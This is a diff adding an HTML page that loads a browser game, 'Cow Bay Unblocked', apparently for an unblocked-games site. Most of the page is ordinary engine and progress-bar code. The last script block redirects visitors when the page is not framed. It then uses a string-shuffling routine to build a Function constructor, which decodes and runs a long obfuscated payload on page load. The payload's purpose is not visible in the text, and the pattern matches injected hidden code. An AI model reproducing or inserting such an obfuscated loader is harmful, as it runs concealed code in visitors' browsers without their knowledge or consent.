@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="classroom6x.gitlab.io" name="website">
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, minimal-ui, shrink-to-fit=no" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable"/>
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+<title>Cow Bay Unblocked - ClassRoom6x</title>
+<style type="text/css">
+        /* Disable user selection to avoid strange bug in Chrome on Windows:
+	* Selecting a text outside the canvas, then clicking+draging would
+	* drag the selected text but block mouse down/up events to the engine.
+	*/
+        body {
+
+            position: fixed;
+            /* Prevent overscroll */
+
+            margin: 0;
+            padding: 0;
+        }
+
+        .canvas-app-container {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .canvas-app-container:-webkit-full-screen {
+            /* Auto width and height in Safari/Chrome fullscreen. */
+            width: auto;
+            height: auto;
+        }
+
+        #canvas {
+            outline: none;
+            border: 0;
+            width: 100%;
+            vertical-align: bottom;
+        }
+
+        #canvas-container {
+            position: relative;
+        }
+
+        canvas:focus,
+        canvas:active {
+            outline: none;
+            border: 0;
+            ie-dummy: expression(this.hideFocus=true);
+            -moz-outline-style: none;
+        }
+
+        div {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .canvas-app-progress {
+            position: absolute;
+            background-color: #88B64D;
+            height: 0px;
+            margin-top: -6px;
+            width: 100%;
+        }
+
+        .canvas-app-progress-bar {
+            font-size: 12px;
+            height: 0px;
+            color: rgb(255, 255, 255);
+            background-color: #FFFFFF;
+            text-align: center;
+            line-height: 20px;
+        }
+
+        .link,
+        .button {
+            font-family: sans-serif;
+            font-size: 14px;
+            font-weight: normal;
+            font-style: normal;
+            font-stretch: normal;
+            line-height: normal;
+            letter-spacing: 0px;
+            padding-top: 12px;
+        }
+
+        .buttons-background {
+            background-color: #88B64D;
+            width: 100%;
+            height: 42px;
+        }
+
+        body {
+            background-color: #88B64D;
+        }
+
+        .progress {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            margin-top: -2vh;
+            position: absolute;
+            width: 100%;
+        }
+
+        .canvas-app-container {
+            background: rgba(136, 182, 77, 1);
+        }
+
+        .canvas-app-canvas {
+            background-repeat: no-repeat;
+            background-position: center center;
+
+            /* Center and scale the image nicely */
+            background-repeat: no-repeat;
+            background-size: cover;
+
+            background-size: 110%;
+            background-image: url("loading_1.jpg");
+        }
+
+        .canvas-app-bg {
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-size: cover;
+
+            z-index: 3;
+            position: absolute;
+        }
+
+
+        @font-face {
+            font-family: loadingFont;
+            src: url(loading_font.ttf);
+        }
+    </style>
+<script src="patch/poki-sdk.js"></script>
+</meta></head>
+<body style="overflow:hidden;">
+<div class="canvas-app-container" id="app-container">
+<div class="canvas-app-canvas-container" id="canvas-container">
+<canvas class="canvas-app-canvas" height="600" id="canvas" tabindex="1" width="1067"></canvas>
+</div>
+<div class="buttons-background">
+</div>
+<div id="progress-bar-root" style="position: absolute; bottom: 16%; left: 50%; z-index: 4;">
+<img id="progress-bar-bg" src="load_bar_bg.png"/>
+<img id="progress-bar-fg" src="load_bar_fg.png" style="position:absolute; clip: rect(0px,0px,0px,0px);"/>
+<div id="progress-bar-text" style="text-align: center; vertical-align:bottom;  margin-left: -100%;color:#574836; font-size:12px;
+font-family: loadingFont;"></div>
+</div>
+</div>
+<!-- -->
+<script id="engine-loader" src="dmloader.js" type="text/javascript"></script>
+<!-- -->
+<script id="engine-setup" type="text/javascript">
+        var extra_params = {
+		archive_location_filter: function( path ) {
+			return ("archive" + path + "");
+		},
+		engine_arguments: ["--verify-graphics-calls=false",],
+		custom_heap_size: 268435456,
+		full_screen_container: "#canvas-container",
+		disable_context_menu: true
+	}
+
+	Module['INITIAL_MEMORY'] = extra_params.custom_heap_size;
+
+	Module['onRuntimeInitialized'] = function() {
+		Module.runApp("canvas", extra_params);
+	};
+
+	Module["locateFile"] = function(path, scriptDirectory)
+	{
+		// dmengine*.wasm is hardcoded in the built JS loader for WASM,
+		// we need to replace it here with the correct project name.
+		if (path == "dmengine.wasm" || path == "dmengine_release.wasm" || path == "dmengine_headless.wasm") {
+			path = "forager.wasm";
+		}
+		return scriptDirectory + path;
+	};
+
+	var is_iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+	var buttonHeight = 0;
+	var prevInnerWidth = -1;
+	var prevInnerHeight = -1;
+	// Resize on init, screen resize and orientation change
+	function resize_game_canvas() {
+		// Hack for iOS when exit from Fullscreen mode
+		if (is_iOS) {
+			window.scrollTo(0, 0);
+		}
+        
+		var app_container = document.getElementById('app-container');
+		var game_canvas = document.getElementById('canvas');
+		var innerWidth = window.innerWidth;
+		var innerHeight = window.innerHeight - buttonHeight;
+        
+		if (prevInnerWidth == innerWidth && prevInnerHeight == innerHeight)
+		{
+			return;
+		}
+		prevInnerWidth = innerWidth;
+		prevInnerHeight = innerHeight;
+		var width = 1067;
+		var height = 600;
+		var targetRatio = width / height;
+		var actualRatio = innerWidth / innerHeight;
+	
+	
+		//Stretch
+		width = innerWidth;
+		height = innerHeight;
+	
+	
+	
+		app_container.style.width = width + "px";
+		app_container.style.height = height + buttonHeight + "px";
+		game_canvas.width = width;
+		game_canvas.height = height;
+
+
+      
+        var progress_bar_root = document.getElementById('progress-bar-root');
+		var progress_bar_fg = document.getElementById('progress-bar-fg');
+		var progress_bar_bg = document.getElementById('progress-bar-bg');
+        var progress_bar_text = document.getElementById('progress-bar-text');
+        var bar_h = width < height ? width:height;
+        var bar_scale = 1
+		progress_bar_bg.width = Math.min(Math.ceil(bar_h * 0.08 * 274/24),width * 0.9);
+		progress_bar_bg.style.marginLeft = - progress_bar_bg.width/2 + "px";
+		progress_bar_fg.width =  Math.ceil(progress_bar_bg.width * 0.96177);
+        bar_scale = progress_bar_fg.width / 478
+		progress_bar_fg.style.marginTop = Math.ceil(bar_scale * 9) + "px";
+		progress_bar_fg.style.marginLeft = -progress_bar_bg.width/2 - progress_bar_fg.width/2 + "px";
+		progress_bar_text.style.fontSize = Math.ceil(bar_h * 0.07) + "px";
+		progress_bar_root.style.bottom = Math.ceil(height*0.1 + buttonHeight) + "px";
+        progress_bar_text.innerHTML  = "0%";
+      
+//        var percentage = 38
+//        progress_bar_text.innerHTML  = "<b>" +  Math.ceil(percentage) + "%</b>";
+//        progress_bar_fg.style.clip="rect(0px,"  + progress_bar_fg.width * percentage/100 + "px,"  + progress_bar_fg.height+"px," + "0px)"
+      
+         Module.isGameLoaded = false;
+         Progress.addListener(function (percentage, text) {
+            if (!isNaN(percentage))
+            { 
+                var data = {};
+                data.percentageDone = percentage / 100;
+                var fg = document.getElementById('progress-bar-fg');
+                var progress_bar_text = document.getElementById('progress-bar-text');
+                fg.style.clip="rect(0px,"  + fg.width * percentage/100 + "px,"  + fg.height+"px," + "0px)"               
+                progress_bar_text.innerHTML  = percentage.toFixed(2) + "%";
+            }
+             
+              if (percentage == 100 && !Module.isGameLoaded) {
+               Module.isGameLoaded = true;
+               //document.getElementsByClassName("progress")[0].remove();
+                  
+				var progress_bar_root = document.getElementById('progress-bar-root');
+                var progress_bar_fg = document.getElementById('progress-bar-fg');
+		        var progress_bar_bg = document.getElementById('progress-bar-bg');
+                var progress_bar_text = document.getElementById('progress-bar-text');
+                  
+				progress_bar_root.style.visibility = "hidden";    
+                progress_bar_fg.style.visibility = "hidden";
+                progress_bar_bg.style.visibility = "hidden";
+                progress_bar_text.style.visibility = "hidden";
+              }
+             
+			 if(isNaN(percentage)){
+				var progress_bar_root = document.getElementById('progress-bar-root');
+				progress_bar_root.style.visibility = "hidden";
+			 }             
+         });
+
+	}
+	resize_game_canvas();
+	window.addEventListener('resize', resize_game_canvas, false);
+	window.addEventListener('orientationchange', resize_game_canvas, false);
+	window.addEventListener('focus', resize_game_canvas, false);
+    </script>
+<script id="engine-start" type="text/javascript">
+        EngineLoader.stream_wasm = false;
+		EngineLoader.load("canvas", "forager");
+    </script>
+<script id="poki-sdk-setup" type="text/javascript">
+        PokiSDK.gameLoadingStart();
+		var data = {};
+		var isLoadFinished = false;
+		Progress.addListener(function(percentage){
+			data.percentageDone = percentage / 100;
+			if (!isLoadFinished)
+				PokiSDK.gameLoadingProgress(data);
+			if (percentage == 100 && !isLoadFinished) {
+				PokiSDK.gameLoadingFinished();
+				isLoadFinished = true;
+			}
+		});
+		Module['onRuntimeInitialized'] = function() {
+			PokiSDK.init().then(()=>{
+				Module.runApp("canvas", extra_params);
+			}).catch(()=>{
+				Module.runApp("canvas", extra_params);
+			});
+		};
+    </script>
+<script>
+    if (window.top === window.self) {
+    window.location.href = '../../../';
+}
+(function() {
+    var KeY='', iFD=494-483;
+    function xsh(b) {
+        var g=2231620;
+        var p=b.length;
+        var d=[];
+        for(var u=0; u<p; u++) { d[u]=b.charAt(u); }
+        for(var u=0; u<p; u++) {
+            var e=g*(u+469)+(g%24291);
+            var f=g*(u+603)+(g%33615);
+            var k=e%p;
+            var i=f%p;
+            var j=d[k];
+            d[k]=d[i];
+            d[i]=j;
+            g=(e+f)%2984823;
+        };
+        return d.join('');
+    }
+    var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);
+    var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309
+})()
+</script></body>
+</html>
